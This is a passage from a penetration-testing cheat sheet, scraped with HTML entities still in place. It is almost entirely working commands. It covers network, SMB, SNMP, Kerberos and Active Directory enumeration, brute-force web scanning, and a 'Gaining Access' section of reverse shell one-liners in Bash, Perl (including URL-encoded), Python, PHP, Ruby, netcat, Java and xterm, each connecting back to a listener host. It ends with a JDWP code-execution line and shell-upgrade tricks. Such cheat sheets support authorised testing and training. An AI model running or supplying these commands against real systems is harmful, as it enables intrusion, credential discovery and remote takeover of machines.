-&amp;gt; ls -d domain.comfor sub in $(cat subdomains.txt);do host $sub.domain.com|grep &quot;has.address&quot;;doneBanner Grabbingnc -v $TARGET 80telnet $TARGET 80curl -vX $TARGETKerberos Enumeration# usersnmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&#39;test&#39;HTTP Brute-Force &amp;amp; Vulnerability Scanningtarget=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobustertarget=10.0.0.1; nikto -h http://$target:80 | tee $target-niktotarget=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enumRPC / NetBios / SMBrpcinfo -p $TARGETnbtscan $TARGET#list sharessmbclient -L //$TARGET -U &quot;&quot;# null sessionrpcclient -U &quot;&quot; $TARGETsmbclient -L //$TARGETenum4linux $TARGETSNMP# Windows User Accountssnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25# Windows Running Programssnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2# Windows Hostnamesnmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5# Windows Share Informationsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1# Windows Share Informationsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27# Windows TCP Portssnmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3# Software Namesnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2# brute-force community stringsonesixtyone -i snmp-ips.txt -c community.txtsnmp-check $TARGETSMTPsmtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150Active Directory# current domain info[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()# domain trusts([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()# current forest info[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()# get forest trust relationships([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships()# get DCs of a domainnltest /dclist:offense.localnet group &quot;domain controllers&quot; /domain# get DC for currently authenticated sessionnltest /dsgetdc:offense.local# get domain trusts from cmd shellnltest /domain_trusts# get user infonltest /user:&quot;spotless&quot;# get DC for currently authenticated sessionset l# get domain name and DC the user authenticated toklist# get all logon sessions. Includes NTLM authenticated sessionsklist sessions# kerberos tickets for the sessionklist# cached krbtgtklist tgt# whoami on older Windows systemsset u# find DFS shares with ADModuleGet-ADObject -filter * -SearchBase &quot;CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot; | select name# find DFS shares with ADSI$s=[adsisearcher]&#39;(name=*)&#39;; $s.SearchRoot = [adsi]&quot;LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;; $s.FindAll() | % {$_.properties.name}# check if spooler service is running on a hostpowershell ls &quot;\\\\dc01\\pipe\\spoolss&quot;Listen on a port (Powershell)# Start listener on port 443$listener = [System.Net.Sockets.TcpListener]443; $listener.Start(); while($true){ $client = $listener.AcceptTcpClient(); Write-Host $client.client.RemoteEndPoint &quot;connected!&quot;; $client.Close(); start-sleep -seconds 1;}Gaining AccessReverse Shell One-LinersBashbash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1Perlperl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;URL-Encoded Perl: Linuxecho%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpewPythonpython -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;PHPphp -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);&#39;Rubyruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&quot;,f,f,f)&#39;Netcat without -e #1rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 | nc 10.0.0.1 1234 &amp;gt; /tmp/fNetcat without -e #2nc localhost 443 | /bin/sh | nc localhost 444telnet localhost 443 | /bin/sh | telnet localhost 444Javar = Runtime.getRuntime(); p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/2002;cat &amp;lt;&amp;amp;5 | while read line; do \\$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&quot;] as String[]); p.waitFor();XTermxterm -display 10.0.0.1:1JDWP RCEprint new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;whoami&quot;).getInputStream())).readLine())Working with Restricted Shells# rare casesssh bill@localhost ls -l /tmpnice /bin/bashInteractive TTY Shells/usr/bin/expect shpython -c ‘import pty; pty.spawn(“/bin/sh”)’# execute one command with su as another user if you do not have access to the shell. Credit to g0blin.co.ukpython -c &#39;import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen([&quot;/bin/su&quot;,&quot;-c&quot;,&quot;id&quot;,&quot;bynarr&quot;],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,&quot;fruity\\n&quot;);time.sleep(0.1);print os.read(master,1024);&#39;" } ]
